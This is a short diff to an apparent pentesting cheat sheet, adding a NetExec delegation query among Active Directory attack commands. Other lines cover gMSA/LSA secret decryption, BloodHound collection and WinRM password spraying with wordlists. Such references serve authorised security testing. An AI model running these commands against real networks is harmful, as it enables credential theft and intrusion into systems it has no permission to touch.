@@ -685,6 +685,7 @@ $ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-convert-id <ID>
 $ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-decrypt-lsa <ACCOUNT>
 $ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M get-network -o ALL=true
 $ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c all
+$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --find-delegation
 $ netexec winrm <SUBNET>/24 -u '<USERNAME>' -p '<PASSWORD>' -d .
 $ netexec winrm -u /t -p '<PASSWORD>' -d '<DOMAIN>' <RHOST>
 $ netexec winrm <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST>
